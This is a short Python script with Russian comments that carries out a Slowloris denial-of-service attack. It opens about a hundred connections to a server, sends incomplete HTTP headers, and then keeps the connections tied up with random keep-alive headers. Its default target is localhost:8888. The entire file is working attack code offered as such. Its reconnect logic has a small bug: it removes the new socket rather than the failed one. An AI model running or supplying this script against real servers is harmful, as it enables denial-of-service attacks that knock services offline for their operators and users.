#!/usr/bin/env python3

import socket
import random
import time

		
# Создаём сокеты
def create_connection(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s

# Функция отправки HTTP-заголовков на сервер
def send_header(s, host):
	header = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
	header += f"Host: {host}\r\n"
	header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
	header += "Content-Length: 42\r\n"
	s.send(header.encode('utf-8'))
	
# Функция отправки 'Keep-Alive' заголовка
def send_keepalive(s):
	keep_alive_header = "X-a: {}\r\n".format(random.randint(1, 5000))
	s.send(keep_alive_header.encode('utf-8'))
	
# Главная функция Slowloris атаки
def slowloris_attack(host, port, num_connections):
	connections = []
	
	# Создаем указанное количество соединений с сервером
	for i in range(num_connections):
		s = create_connection(host, port)
		send_header(s, host)
		connections.append(s)
		
	print(f"Идет атака Slowloris на {host}:{port}")
	
	while True:
		# Отправляем 'Keep-Alive' заголовок для каждого соединения
		for s in connections:
			try:
				send_keepalive(s)
				time.sleep(1) # Задержка перед отправкой следующего пакета
			except socket.error:
				# Если возникает ошибка, закрываем соединение и создаем новое
				s = create_connection(host, port)
				send_header(s, host)
				connections.remove(s)
				connections.append(s)
				
		# Устанавливаем таймаут, после которого соединение будет считаться закрытым
		time.sleep(30)
		
if __name__ == "__main__":
	# Установливаем значения целевого хоста, порта и количества соединений
	target_host = "localhost"
	target_port = 8888
	num_connections = 100
	
	# Запуск атаки
	slowloris_attack(target_host, target_port, num_connections)
	
	
		
		